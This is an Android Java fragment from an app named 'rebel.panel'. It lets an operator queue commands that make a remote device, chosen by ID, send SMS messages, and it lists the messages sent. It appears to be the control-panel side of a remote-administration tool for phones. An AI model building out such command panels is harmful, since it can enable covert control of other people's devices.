package com.rebel.panel.fragments;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.rebel.panel.R;
import com.rebel.panel.firebase.PanelRepository;
import com.rebel.panel.ui.KeyValueAdapter;

public class SendSmsTabFragment extends DeviceTabFragment {

    public static SendSmsTabFragment newInstance(String deviceId) {
        SendSmsTabFragment f = new SendSmsTabFragment();
        Bundle b = new Bundle();
        b.putString(ARG_DEVICE_ID, deviceId);
        f.setArguments(b);
        return f;
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_send_sms, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        EditText toField = view.findViewById(R.id.send_to);
        EditText msgField = view.findViewById(R.id.send_message);
        TextView status = view.findViewById(R.id.send_status);
        Button sendBtn = view.findViewById(R.id.send_btn);
        RecyclerView history = view.findViewById(R.id.sent_history);
        KeyValueAdapter adapter = new KeyValueAdapter();
        history.setLayoutManager(new LinearLayoutManager(getContext()));
        history.setAdapter(adapter);

        sendBtn.setOnClickListener(v -> {
            String to = toField.getText().toString().trim();
            String msg = msgField.getText().toString().trim();
            if (to.isEmpty() || msg.isEmpty()) {
                status.setText(R.string.fill_all_fields);
                status.setTextColor(0xFFFF4466);
                return;
            }
            PanelRepository.get().sendSmsCommand(deviceId, to, msg, new PanelRepository.VoidCallback() {
                @Override
                public void onSuccess() {
                    if (!isAdded()) return;
                    status.setText(R.string.command_sent);
                    status.setTextColor(0xFF00FF9D);
                    msgField.setText("");
                    Toast.makeText(getContext(), R.string.sms_queued, Toast.LENGTH_SHORT).show();
                }

                @Override
                public void onError(String message) {
                    if (!isAdded()) return;
                    status.setText(message);
                    status.setTextColor(0xFFFF4466);
                }
            });
        });

        PanelRepository.get().listenSentSms(deviceId, rows -> {
            if (!isAdded()) return;
            adapter.submit(rows, new String[]{"to", "message", "sent_at"});
        });
    }
}
